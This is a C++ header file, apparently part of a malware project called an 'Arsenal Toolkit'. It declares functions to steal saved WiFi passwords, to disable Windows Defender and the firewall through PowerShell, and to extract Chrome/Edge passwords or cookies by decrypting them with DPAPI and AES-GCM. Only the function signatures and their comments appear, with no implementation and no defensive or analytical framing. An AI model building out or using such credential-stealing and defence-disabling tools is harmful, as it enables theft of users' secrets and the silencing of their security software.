#pragma once
#include <string>

// --- Phase 3: Arsenal Toolkit ---

// 1. WiFi Stealer: Lists profiles and passwords
std::string steal_wifi();

// 2. AV Killer: Attempts to disable Windows Defender and Firewall using PowerShell
std::string av_kill();

// 3. Browser Data Stealer: Extracts passwords or cookies from Chrome/Edge using DPAPI & AES-GCM
// mode: "passwords" or "cookies"
std::string steal_browser_data(const std::string& mode);
